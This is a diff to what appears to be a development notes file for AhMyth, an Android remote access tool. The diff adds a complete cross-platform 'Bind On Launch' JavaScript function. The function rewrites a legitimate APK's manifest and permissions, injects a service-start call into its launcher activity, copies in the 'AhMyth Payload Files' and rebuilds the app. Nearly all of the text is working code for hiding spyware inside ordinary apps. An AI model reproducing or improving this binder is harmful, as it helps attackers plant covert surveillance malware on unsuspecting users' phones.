@@ -158,89 +158,224 @@ process.on('uncaughtException', function (error) {
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
 
-## New Almost Complete Bind On Launch function for Windows, Linux & macOS
-I had no idea that PowerShell was installable for most Linux distributions!
-
-the same commands here for windows PowerShell, work the same for Linux PowerShell,
-just need to figure out how to run PowerShell Cross-Platform using OS detection because running the Windows
-Variant of this function executes `powershell.exe`, whereas the Linux/OSX variant executes `pwsh`!
+## New Complete Bind On Launch function for Windows, Linux & macOS!
 ```js  
-                // This makes use of the 'set-location' & 'gci' PowerShell 
-                // commands to locate the Launcher Activity
-                $appCtrl.Log("Locating Launcher Activity...");
-                $appCtrl.Log();
-                exec('set-location ' + apkFolder + ';' + ' gci -path ' + apkFolder + ' -recurse -filter ' + launcherActivity + 
-                    ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
-                    var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
-                    if (error !== null) {
-                        $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                        $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
-                        $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO);
-                        $appCtrl.Log(error);
+     $appCtrl.BindOnLauncher = (apkFolder) => {
+
+
+    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml... \n\n');
+    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+        if (error) {
+            $appCtrl.Log('Reading AndroidManifest.xml Failed! \n\n', CONSTANTS.logStatus.FAIL);            
+            return;
+        }
+
+        var launcherActivity = GetLauncherActivity(data, apkFolder);
+        if (launcherActivity == -1) {
+            $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
+            $appCtrl.Log("Please Template Another APK. \n\n", CONSTANTS.logStatus.INFO);
+            return;
+        }
+
+        var ahmythService = CONSTANTS.ahmythService;
+        $appCtrl.Log('Modifying AndroidManifest.xml... \n\n');
+        var permManifest = $appCtrl.copyPermissions(data);
+        var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
+        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
+            if (error) {
+                $appCtrl.Log('Modifying AndroidManifest.xml Failed! \n\n', CONSTANTS.logStatus.FAIL);                
+                return;
+            }
+            
+            if (process.platform === 'win32') {
+                $appCtrl.Log("Locating Launcher Activity... \n\n")
+                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
+                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
+                + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
+                var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
+                if (error !== null) {
+                    $appCtrl.Log("Unable to Locate the Launcher Activity... \n\n", CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                    return;
+                } else if (launcherPath) {
+                    $appCtrl.Log("Launcher Activity Found: " + launcherPath + "\n\n", CONSTANTS.logStatus.SUCCESS);
+                }
+
+                $appCtrl.Log("Fetching Launcher Activity... \n\n")
+                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+                    if (error) {
+                        $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
                         return;
-                      }
-                      
-                      $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
-                      $appCtrl.Log();
-                      $appCtrl.Log("Fetching Launcher Activity...")
-                      $appCtrl.Log();
-                      fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
-                          if (error) {
-                              $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
-                              $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
-                              $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO);
-                              $appCtrl.Log(error);
-                              return;
+                        }
+
+                        var regex = /\/(\S+)\./;
+                        var str = (apkFolder, launcherPath);
+                        var m = str.replace(/\\/g, "/").match(regex);
+
+                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
+
+
+                        var key = CONSTANTS.orgAppKey;
+                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                            if (error) {
+                                $appCtrl.Log('Modifying Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                                return;
                             }
-                
-                            var regex = /\/(\S+)\./;
+
+                            var regex = /[^/]+\//;
                             var str = (apkFolder, launcherPath);
                             var m = str.replace(/\\/g, "/").match(regex);
-                
-                            var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
-                
-                
-                            var key = CONSTANTS.orgAppKey;
-                            $appCtrl.Log("Modifiying Launcher Activity...");
-                            $appCtrl.Log();
-                            var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+
+                            var smaliFolder = m[0];
+
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                 if (error) {
-                                    $appCtrl.Log('Modifying Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
-                                    $appCtrl.Log();
+                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                                     return;
                                 }
+                                $appCtrl.GenerateApk(apkFolder);
                 
-                                var regex = /[^/]+\//;
-                                var str = (apkFolder, launcherPath);
-                                var m = str.replace(/\\/g, "/").match(regex);
-                
-                                var smaliFolder = m[0];
-                
-                                $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
-                                $appCtrl.Log();
-                                fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
-                                    if (error) {
-                                        $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
-                                        $appCtrl.Log();
-                                        return;
-                                    }
-                                
-                                $appCtrl.GenerateApk(apkFolder)
-                    
+                            });
+                            
+                        });
+
+                    });
+
+                });
+
+            } else if (process.platform === "linux") {
+                $appCtrl.Log("Locating Launcher Activity... \n\n");
+
+                // makes use of the GNU findutils `find` command
+                // similar to Apple's BSD findutils `find` command
+                // GNU findutils comes pre-installed with most Linux distributions
+                // such as Debian (incl. Kali & ParrotOS)
+                exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
+                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n\n");
+                if (error !== null) {
+                    $appCtrl.Log("Cannot Locate the Launcher Activity... \n\n");
+                    $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                    return;
+                }
+
+                $appCtrl.Log("Launcher Activity Found: " + launcherPath + '\n\n');
+                $appCtrl.Log("Fetching Launcher Activity... \n\n")
+                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+                    if (error) {
+                        $appCtrl.Log('Reading Launcher Activity Failed');
+                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                        return;
+                        }
+
+                        var regex = /\/(\S+)\./;
+                        var str = (apkFolder, launcherPath);
+                        var m = str.match(regex);
+
+                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
+
+
+                        var key = CONSTANTS.orgAppKey;
+                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                            if (error) {
+                                $appCtrl.Log('Modifying Launcher Activity Failed! \n\n', CONSTANTS.logStatus.FAIL);
+                                return;
+                            }
+
+                            var regex = /[^/]+\//;
+                            var str = (apkFolder, launcherPath);
+                            var m = str.match(regex);
+
+                            var smaliFolder = m[0];
+
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
+                                if (error) {
+                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    return;
+                                }
+                            
+                                $appCtrl.GenerateApk(apkFolder);
+
+                                });
+
                             });
 
                         });
 
                     });
 
-                });
-                
+            } else {
+                (process.platform === "darwin");
+                $appCtrl.Log("Locating Launcher Activity... \n\n");
+                exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
+                    var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n\n").replace(/^\/+/g, '');
+                    if (error !== null) {
+                        $appCtrl.Log("Cannot Locate the Launcher Activity... \n\n");
+                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                        return;
+                    }
+
+                    $appCtrl.Log("Launcher Activity Found: " + launcherPath);
+                    $appCtrl.Log("Fetching Launcher Activity... \n\n")
+                    fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+                        if (error) {
+                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAILED);
+                            $appCtrl.Log('Please use the "On Boot" Method  \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                            return;
+                        }
+
+                        var regex = /\/(\S+)\./;
+                        var str = (apkFolder, launcherPath);
+                        var m = str.match(regex);
+
+                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
+
+
+                        var key = CONSTANTS.orgAppKey;
+                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                            if (error) {
+                                $appCtrl.Log('Modifying Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                                return;
+                            }
+
+                            var regex = /[^/]+\//;
+                            var str = (apkFolder, launcherPath);
+                            var m = str.match(regex);
+
+                            var smaliFolder = m[0];
+
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
+                                if (error) {
+                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    return;
+                                }
+                            
+                                $appCtrl.GenerateApk(apkFolder)
+                                    
+                                });
+                                
+                            });
+
+                        });
+
+                    });
+
+                };
+
             });
 
         });
 
-    }
+    };
 ```
 ## New `GetLauncherActivity` function | supersedes the old `GetLauncherPath` function
 ```js
